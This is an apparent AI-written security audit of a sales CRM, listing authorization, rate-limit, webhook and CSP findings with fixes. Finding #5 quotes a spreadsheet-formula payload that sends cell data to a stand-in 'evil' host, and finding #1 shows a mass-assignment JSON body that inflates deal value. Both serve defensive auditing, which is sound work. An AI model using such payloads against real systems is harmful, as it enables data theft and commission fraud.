# Security audit — 2026-07-31

Six-dimension sweep (authorization, authentication, injection, data exposure, secrets,
public webhooks) with an adversarial verification pass on every finding. 20 candidate
findings, 16 confirmed, 4 refuted. Duplicates across dimensions are merged below, so 16
raw findings collapse to 12 distinct issues.

**The structural fact behind most of this:** Supabase is accessed with the service-role
key, so RLS is bypassed and *every* authorization decision lives in application code. A
route that forgets a role check has no backstop. Middleware only marks four families
admin-only (`users`, `analytics`, `settings`, `integrations`); everything else depends on
its own handler.

**Severity is my judgement, not the scanner's.** Where I disagree with the automated
verdict I say so and why — the deciding factor is that reps are commissioned, so data
that feeds the leaderboard is worth more to an attacker here than in a generic CRM.

---

## P0 — fix before more reps get accounts

### 1. ~~Any setter can award themselves leads, set deal value, and mark them sold~~ — FIXED (`5568a3b`)
`src/app/api/admin/leads/route.ts:183` · attacker: setter or closer

**Fixed 2026-07-31.** The whitelist and the setter status rules moved to
`src/lib/leads/lead-fields.ts`, which both the create and update routes now import —
one copy of the rule rather than two that drift. Create refuses `sold` from a setter with
the same 403 as update, and drops `deal_value` / `assigned_*` / `market_id` for non-admins.
15 unit tests cover the guard directly. Confirmed all 30 fields the lead form sends still
survive the whitelist, so nothing silently stopped saving.

The original finding, for the record:

The POST handler destructures four fields and spreads the rest of the JSON body straight
into a service-role insert:

```
const { first_name, last_name, phone, email, ...rest } = body;
...
.insert({ first_name, last_name, phone, phone_normalized, email, ...rest, ... })
```

`admin.role` is never read anywhere in the handler. So a setter can POST
`{"status":"sold","deal_value":250000,"assigned_setter_id":"<their id>","market_id":2}`
and every column is written verbatim.

Why this is P0 rather than the "medium" the verifier assigned: `deal_value` and
`assigned_setter_id` are exactly what `/api/admin/stats` sums and what the
`/api/admin/performance` leaderboard attributes. A commissioned rep can inflate their own
numbers. That is payroll fraud, not a data-integrity nit. The mitigating detail is real
though — they can only fabricate *new* rows, and every row is stamped `created_by`, so it
is auditable after the fact.

**The fix already exists in this codebase.** The sibling PATCH handler defines it at
`src/app/api/admin/leads/[leadId]/route.ts:21` and applies it at line 223:

```
const LEAD_ADMIN_ONLY_FIELDS = new Set(['deal_value','assigned_setter_id','assigned_closer_id','market_id']);
if (LEAD_ADMIN_ONLY_FIELDS.has(key) && admin.role !== 'admin') continue;
```

Move that set to a shared module and build the POST insert from an allowlist instead of
`...rest`. Also force `status` through the setter-allowed list and derive `market_id`
server-side.

### 2. ~~Lead activity feed skips authentication entirely, so revoked sessions still work~~ — FIXED
`src/app/api/admin/leads/[leadId]/activities/route.ts:6` · attacker: any authenticated, incl. revoked

**Fixed 2026-07-31.** The GET now calls `getAuthenticatedAdmin()` (which is what runs the
`token_version` revocation check) and applies the lead detail route's closer rule via a new
shared `canViewLead()` in `src/lib/leads/lead-visibility.ts`, with 5 tests.

Two further gaps found while fixing it and closed in the same change:
- The **POST** in that file authenticated but never checked visibility, so a closer could
  append notes to a lead they cannot read. It already loaded the row; it now selects
  `status` and applies the same rule.
- `GET /api/admin/leads/sources` had no auth call at all. Only vendor names, so the data
  is dull, but it was the same revocation bypass. A sweep of all 33 admin routes now
  shows only `auth/login` and `auth/logout` without an auth call, which is correct.

The original finding:

`getAuthenticatedAdmin` is imported on line 3 and called in POST on line 38 — but the GET
on line 6 never calls it.

That is not merely a missing role check. `token_version` revocation is enforced *inside*
`getAuthenticatedAdmin`, and `src/middleware.ts` verifies only the JWT signature and
expiry. So this endpoint honours no revocation: "log out everywhere", a role change, or
firing a rep does not lock them out of it until the token expires on its own. Closers can
also read activity for leads they are otherwise walled off from.

**Fix:** call `getAuthenticatedAdmin()` at the top of the GET, 401 on null, then apply the
parent route's closer rule.

---

## P1 — fix soon

### 3. ~~Any rep can delete or reschedule anyone's appointment~~ — FIXED
`src/app/api/admin/leads/[leadId]/appointments/[appointmentId]/route.ts:183`

**Fixed 2026-07-31.** New `canModifyAppointment()` in `appointment-outcomes.ts` (7 tests),
applied to DELETE and to the reschedule/notes branch of PATCH: admin, the rep who booked
it, or a rep the lead is assigned to. Deliberately omits `canRecordOutcome`'s
`existingOutcomeBy` rule — that protects a recorded judgement from being rewritten, while
rebooking your own visit after marking it a no-show is legitimate.

`getOwnedAppointment` was renamed in spirit rather than fact: its doc comment now states
it proves only the appointment-to-lead relationship, not caller ownership. Conflating
those two is what left cancelling unguarded.

Checked against live data before shipping: all 4 existing appointments have a `created_by`,
so no rep is locked out of a booking they made.

The original finding:

DELETE removes the row unconditionally; PATCH moves `scheduled_at` for any caller. The
helper named `getOwnedAppointment` only filters `id` + `lead_id` — despite the name it
checks no user ownership.

This defeats a control the same file deliberately implements. A rep blocked by
`canRecordOutcome` with *"You cannot change this outcome"* when overwriting a colleague's
`no_show` can simply delete the appointment instead, erasing the outcome and its
contribution to the performance report.

**Fix:** apply the same ownership predicate to DELETE and to the `scheduled_at` branch —
admin, or creator, or assignee.

### 4. Any rep can permanently delete any lead's photos
`src/app/api/admin/leads/[leadId]/photos/[photoId]/route.ts:46`

No ownership or role check before deletion. Irreversible — these are damage-evidence
photos.

**Fix:** select `created_by` with `storage_path` and require admin or creator.

### 5. CSV formula injection from a public, unauthenticated source
`src/app/api/admin/leads/export/route.ts:6`

`escapeCsv` handles commas and quotes but not leading `= + - @`. A lead whose name is
`=HYPERLINK("http://evil/?"&A1,"click")` executes when an admin opens the export in Excel
or Sheets.

Rated higher than the scanner's "low" because of the vector: `/api/webhooks/inbound` is
public, so the attacker needs **no account at all** to plant the payload, and the target
is always an admin — the only role that can now export.

**Fix:** in `escapeCsv`, prefix any value starting with `= + - @ \t \r` with a single
quote before the existing quote/comma escaping.

### 6. A successful login wipes the shared brute-force budget
`src/app/api/admin/auth/login/route.ts:84`

Login is limited to 5 attempts per 15 min keyed on client IP, and a success calls
`resetRateLimit` on that shared per-IP bucket. So any valid account holder can burn 4
guesses at `admin@…`, log into their own account to clear the counter, and repeat
indefinitely.

Noting the provenance honestly: I added that reset earlier in this session to stop a
lockout, and in doing so I opened this. The lockout fix was right; keying the reset to a
shared bucket was not.

**Fix:** add a second limiter keyed on the submitted email so guesses against one account
accumulate regardless of source, and stop resetting the shared bucket on success.

---

## P2 — real, low impact

### 7. Closers can read knocks, calls and photos for leads they are walled off from
`src/app/api/admin/leads/[leadId]/knocks/route.ts:128` — the parent lead route enforces
`closer && status !== 'sold'`, the child collections do not. Best fixed once as a shared
`assertLeadVisible` helper so the rule cannot drift.

### 8. `/api/admin/activity` exposes every lead's PII and every rep's trail
`src/app/api/admin/activity/route.ts:28` — accepts an arbitrary `user_id` from any role,
with no closer status filter. The sibling `contact-activity` route already does this
correctly via `resolveContactActivityUser`; copy that.

### 9. `/api/admin/stats` returns pre-appointment lead PII to closers
`src/app/api/admin/stats/route.ts:39` — the only read route with no identity logic at all.

### 10. Webhook API key travels in the URL path and query string
`src/app/api/webhooks/inbound/[apiKey]/route.ts:15` — a live lead-injection credential
written into every proxy, CDN and analytics log. Keep the `x-api-key` header form; drop
the path and `?api_key=` variants.

*Contested:* the webhooks-dimension verifier refuted this while the secrets-dimension one
confirmed it. I side with confirming — credentials in URLs is a well-established logging
exposure regardless of whether a specific exploit was demonstrated.

### 11. `/api/admin/import` has no rate limit and pages the whole leads table into memory
`src/app/api/admin/import/route.ts:81` — any setter can exhaust the function. Import is
open to all roles deliberately, so this is the one place that decision costs something.

---

## P3 — hardening

### 12. CSP allows `unsafe-inline` for scripts
`next.config.ts:8` — unconditional. The verifier refuted it as a vulnerability because no
reachable XSS sink was found, which is fair. It stays on the list as defence-in-depth: it
is the difference between one future XSS being contained or not.

---

## Not vulnerabilities, but do them

- ~~**Rotate the Geocodio key**~~ — **ACCEPTED RISK, closed 2026-07-31.** Three rotation
  attempts each re-saved the same key (verified by SHA-256: the stored value stayed
  byte-identical to the exposed one, while `updated_at` confirmed the writes were
  landing). Owner decided not to pursue it further. The exposure is bounded: a free-tier
  geocoding key that cannot reach leads, the database, or customers — the worst case is
  a stranger consuming the monthly lookup quota. Do not re-raise.
- **Check `CRON_SECRET` in Vercel** — both cron handlers 401 without it. If unset, storm
  alerts and appointment reminders have never fired. Undetectable from outside: the
  endpoint returns 401 whether the secret is missing or merely absent from the request.

---

## Refuted — checked and dismissed

Recorded so they are not re-litigated:

1. **`CRON_SECRET` compared non-constant-time** — true of the code, but no practical
   timing oracle across a network for a bearer token of this shape.
2. **CSP `unsafe-inline`** — real, but no reachable sink. Retained above as P3 hardening.
3. **Webhook key in URL** — refuted by one dimension, confirmed by another. Kept as #10.
4. **Webhooks query the DB before rate limiting** — ordering is accurate, but no
   substantiated amplification.

## Out of scope by prior decision

Shared dev/production Supabase project; production email deliberately disabled.

## Fixed during this session

`GET /api/admin/leads/export` is now admin-only in both the UI and the route handler
(commit `5fc5bb6`), and the dead closer-scoping branches inside it were removed.
